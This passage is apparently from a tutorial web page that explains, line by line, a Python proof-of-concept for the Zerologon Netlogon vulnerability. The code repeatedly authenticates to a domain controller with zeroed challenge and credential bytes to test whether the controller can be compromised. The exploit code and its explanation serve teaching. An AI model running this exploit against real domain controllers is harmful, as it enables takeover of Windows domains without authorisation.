style="color:rgb(248, 248, 242)">(</span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> MAX_ATTEMPTS</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    rpc_con </span><span class="token operator">=</span><span class="token plain"> try_zero_authenticate</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">dc_handle</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> dc_ip</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> target_computer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> rpc_con </span><span class="token operator">==</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;=&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> end</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> flush</span><span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> rpc_con</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;\nSuccess! DC can be fully compromised by a Zerologon attack.&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;\nAttack failed. Target is probably patched.&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    sys</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">exit</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Line 1 is defining where the variables are being passed into for the local function, <!-- -->\<!-- -->DCNAME is being passed into the dc_handle variable, dc_ip is being passed into dc_ip variable, and dc_name is being passed into the target_computer variable. All of which will be used later, or passed into different modules.</p><p>Line 4 sets the variable rpc_con equal to none, this will be kept track of consistently to check and see if authentication is successful, if it&#x27;s not, the script will continue until 2000 retries is hit. Line 5 is where the actual retries for Zero Logon occurs in the form of a for loop. Line 6 sets the rpc_con variable to the output of a different function called &quot;try_zero_authenticate&quot; with a couple of variables being passed to it, specifically dc_handle, dc_ip, and target_computer. All of which we addressed earlier. The next lines are simply checking if rpc_con is equal to a invalid login attempt, if it is, print =, if not, print success, if 2000 retries is hit: print attack failed.</p><p><strong>Lines 20-25</strong></p><div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">try_zero_authenticate</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">dc_handle</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> dc_ip</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> target_computer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    binding </span><span class="token operator">=</span><span class="token plain"> epm</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">hept_map</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">dc_ip</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> nrpc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">MSRPC_UUID_NRPC</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> protocol</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;ncacn_ip_tcp&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    rpc_con </span><span class="token operator">=</span><span class="token plain"> transport</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">DCERPCTransportFactory</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">binding</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">get_dce_rpc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    rpc_con</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">connect</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    rpc_con</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">bind</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">nrpc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">MSRPC_UUID_NRPC</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Line 1 is defining the try_zero_authenticate function and is taking the previously mentioned 3 variables as input, and is passing them into the function. Lines 3-6 are establishing a bind and a session with NRPC over TCP/IP so that we can communicate with the domain controller.</p><p><strong>Lines 27-40</strong></p><div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">plaintext </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b&#x27;\x00&#x27;</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token number">8</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ciphertext </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b&#x27;\x00&#x27;</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token number">8</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">flags </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0x212fffff</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nrpc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">hNetrServerReqChallenge</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">rpc_con</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> dc_handle </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;\x00&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> target_computer </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;\x00&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> plaintext</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">try</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">server_auth </span><span class="token operator">=</span><span class="token plain"> nrpc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">hNetrServerAuthenticate3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">rpc_con</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> dc_handle </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;\x00&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> target_computer </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;$\x00&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> nrpc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">NETLOGON_SECURE_CHANNEL_TYPE</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">ServerSecureChannel</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain">target_computer </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;\x00&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> ciphertext</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> flags</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Line 1 and 2 are establishing two new variables, plaintext and ciphertext containing 16 Bytes of &quot;\x00&quot; which will be used to exploit the Zero Logon vulnerability. Line 4 contains a variable called Flags. These are the default flags observed from a Windows 10 Client (using AES-CFB8) with the Sign and Seal bit disabled (Source/Credit: Secura).</p><p>Line 6 is where the fun beings -- This is where Step 1 beings in Figure 1, the client creates a NetrServerReqChallenge containing the following information required by the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/5ad9db9f-7441-4ce5-8c7b-7b771e243d32" target="_blank" rel="noopener noreferrer">Microsoft Documentation</a>:</p><div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">NTSTATUS NetrServerReqChallenge</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> unique</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> string</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> LOGONSRV_HANDLE PrimaryName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> string</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> wchar_t</span><span class="token operator">*</span><span class="token plain"> ComputerName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> PNETLOGON_CREDENTIAL ClientChallenge</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The Primary Name being the DC Handle, the Computer Name being the Target Computer, and the Client Challenge being 16 bytes of &quot;\x00&quot;.</p><p>And the client will receive back, which will be used in Figure 1, Step 2:</p><div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">NTSTATUS NetrServerReqChallenge</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">out</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> PNETLOGON_CREDENTIAL ServerChallenge</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Lines 8 sets up a try except (we&#x27;ll see the rest of that in the next few lines), but in line 9 is where we actually attempt to exploit the Zero Logon vulnerability, this would be Figure 1, Step 3. This section requires a fair bit more information, per the Microsoft Documentation for NetrServerAuthenticate3, the following is required:</p><div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">NTSTATUS NetrServerAuthenticate3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> unique</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> string</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> LOGONSRV_HANDLE PrimaryName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> string</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> wchar_t</span><span class="token operator">*</span><span class="token plain"> AccountName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> string</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> wchar_t</span><span class="token operator">*</span><span class="token plain"> ComputerName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> PNETLOGON_CREDENTIAL ClientCredential</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> out</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> ULONG </span><span class="token operator">*</span><span class="token plain"> NegotiateFlags</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>On line 9, we supply the the DC_Handle as the Primary Name, the Target Computer plus a $ as the Machine Account Name (Recall, Machine accounts do not have lockout policies), the Secure Channel Type as the Secure Channel Type previously established over RPC, the target_computer variable as the ComputerName, the Ciphertext (16 bytes of &quot;\x00&quot; attempting to Abuse Zero Logon, remember there&#x27;s 1-in-256 chance that the Ciphertext will be the same as the plaintext), and lastly, our flags variable that mimics those of a Windows 10 client machine.</p><div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">NTSTATUS NetrServerAuthenticate3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">out</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> PNETLOGON_CREDENTIAL ServerCredential</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> out</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> ULONG </span><span class="token operator">*</span><span class="token plain"> NegotiateFlags</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">out</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> ULONG </span><span class="token operator">*</span><span class="token plain"> AccountRid</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Additionally, we expect to receive two (possibly 3) things back from the Server upon (hopefully) successful exploitation of Zero Logon: The ServerCredential and AccountRid, only one of which we are going to use.</p><p><strong>Line 44 - 54</strong></p><div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">assert</span><span class="token plain"> server_auth</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;ErrorCode&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">==</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> rpc_con</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">except</span><span class="token plain"> nrpc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">DCERPCSessionError </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">as</span><span class="token plain"> ex</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> ex</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">get_error_code</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">==</span><span class="token plain"> </span><span class="token number">0xc0000022</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    fail</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f&#x27;Unexpected error code from DC: </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">ex</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token string-interpolation interpolation">get_error_code</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">.&#x27;</span><span class="token punctuation" style="color:rgb(248, 